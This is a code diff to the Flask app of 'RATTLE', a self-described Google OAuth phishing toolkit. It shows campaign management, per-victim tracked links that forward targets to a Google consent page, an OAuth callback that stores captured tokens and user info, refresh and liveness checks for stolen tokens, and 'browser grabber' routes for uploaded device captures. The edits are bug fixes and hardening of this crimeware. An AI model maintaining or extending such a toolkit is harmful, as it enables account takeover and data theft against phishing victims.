@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 # ============================================
 # RATTLE - Google OAuth Phishing Toolkit
-# Version: 1.1 (hardened)
+# Version: 1.2 (hardened)
 # Coded by t.me/officialmonsterz
 # ============================================
 
@@ -25,13 +25,12 @@ from flask import (
     redirect,
     render_template,
     request,
+    send_from_directory,
     session,
     url_for,
 )
-from flask import send_from_directory
 from flask_migrate import Migrate
 from sqlalchemy import text
-from werkzeug.security import check_password_hash, generate_password_hash
 
 from liveness import check_all_tokens, start_liveness_worker
 from models import AuditLog, Campaign, Grab, Token, User, Victim, db, utcnow
@@ -67,7 +66,7 @@ def setting(name, default=""):
 
 def load_or_create_secret_key():
     """
-    Bug #1 fix: a SECRET_KEY that survives restarts and is identical across
+    A SECRET_KEY that survives restarts and is identical across
     all gunicorn workers. Reads RATTLE_SECRET_KEY (env/config), otherwise
     generates one and persists it in the instance folder.
     """
@@ -88,7 +87,12 @@ def load_or_create_secret_key():
 app.config["SECRET_KEY"] = load_or_create_secret_key()
 app.config["SQLALCHEMY_DATABASE_URI"] = setting("DATABASE_URL", "sqlite:///rattle.db")
 app.config["SQLALCHEMY_TRACK_MODIFICATIONS"] = False
-app.config["SESSION_COOKIE_SECURE"] = True
+# Secure cookies by default. If your SSL setup ever fails and the site runs
+# on plain HTTP, set SESSION_COOKIE_SECURE=false in config.py / env,
+# otherwise browsers will refuse to send the login cookie over HTTP.
+app.config["SESSION_COOKIE_SECURE"] = setting(
+    "SESSION_COOKIE_SECURE", "true"
+).strip().lower() in ("1", "true", "yes", "on")
 app.config["SESSION_COOKIE_HTTPONLY"] = True
 app.config["SESSION_COOKIE_SAMESITE"] = "Lax"
 app.config["PERMANENT_SESSION_LIFETIME"] = timedelta(hours=8)
@@ -176,7 +180,7 @@ def _complete_login(user):
 
 
 # ============================================
-# Create Default Admin User (hashed random password - bug #3 fix)
+# Create Default Admin User (hashed random password)
 # ============================================
 
 
@@ -282,7 +286,6 @@ def mfa_setup():
     )
 
 
-
 @app.route("/mfa/disable", methods=["POST"])
 @login_required
 def mfa_disable():
@@ -304,7 +307,7 @@ def logout():
 
 
 # ============================================
-# Health endpoint (new feature - for uptime monitoring)
+# Health endpoint (for uptime monitoring)
 # ============================================
 
 
@@ -425,7 +428,7 @@ def campaign_detail(campaign_id):
 @app.route("/campaign/<int:campaign_id>/add_target", methods=["POST"])
 @login_required
 def add_target(campaign_id):
-    """Per-target tracked link (new feature)."""
+    """Per-target tracked link."""
     campaign = db.session.get(Campaign, campaign_id)
     if campaign is None:
         return "Campaign not found", 404
@@ -476,7 +479,7 @@ def generate_qr(campaign_id):
 
 
 # ============================================
-# Per-target tracked link (new feature)
+# Per-target tracked link
 # ============================================
 
 
@@ -486,7 +489,7 @@ def tracked_link(tracking_id):
     Each target gets a unique /link/<code> URL. The click is counted, then
     the target is forwarded to the campaign's Google consent page with
     state=<tracking_id>, which comes back on /callback so we know exactly
-    which target consented (fixes bug #4 - wrong campaign attribution).
+    which target consented.
     """
     victim = Victim.query.filter_by(tracking_id=tracking_id).first()
     if victim is None:
@@ -549,7 +552,7 @@ def api_token(token_id):
 @app.route("/token/<int:token_id>/refresh", methods=["POST"])
 @login_required
 def refresh_token(token_id):
-    """Manual refresh - also updates the liveness status (fixes bug #15)."""
+    """Manual refresh - also updates the liveness status."""
     token = db.session.get(Token, token_id)
     if token is None:
         return jsonify({"error": "Not found"}), 404
@@ -676,7 +679,7 @@ def oauth_callback():
     if not auth_code:
         return "No authorization code received.", 400
 
-    # Bug #4 fix: the tracked link carries the campaign identity in "state".
+    # The tracked link carries the campaign identity in "state".
     state = request.args.get("state", "")
     victim = Victim.query.filter_by(tracking_id=state).first() if state else None
 
@@ -747,7 +750,8 @@ def oauth_callback():
         expires_in=token_data.get("expires_in"),
         scope=token_data.get("scope"),
         user_info=json.dumps(user_info),
-        expiry_time=utcnow() + timedelta(seconds=token_data.get("expires_in", 3600)),
+        # "or 3600" protects against a null expires_in (which would crash below)
+        expiry_time=utcnow() + timedelta(seconds=int(token_data.get("expires_in") or 3600)),
         status="valid",
         last_checked=utcnow(),
     )
@@ -803,7 +807,7 @@ def check_all_tokens_now():
     return redirect(url_for("tokens"))
 
 # ============================================
-# Browser Grabber Routes (new feature)
+# Browser Grabber Routes
 # ============================================
 
 
@@ -849,13 +853,16 @@ def grab_delete(grab_id):
     grab = db.session.get(Grab, grab_id)
     if grab is None:
         return "Not found", 404
+    # Save the label BEFORE deleting - SQLAlchemy 2.x raises an error if you
+    # read attributes of a row that has already been deleted and committed.
+    device_label = grab.device_label
     try:
         os.remove(os.path.join(GRAB_DIR, grab.filename))
     except OSError:
         pass
     db.session.delete(grab)
     db.session.commit()
-    audit("grab_deleted", f"grab_id={grab_id} device={grab.device_label}")
+    audit("grab_deleted", f"grab_id={grab_id} device={device_label}")
     return redirect(url_for("grabs"))
 
 
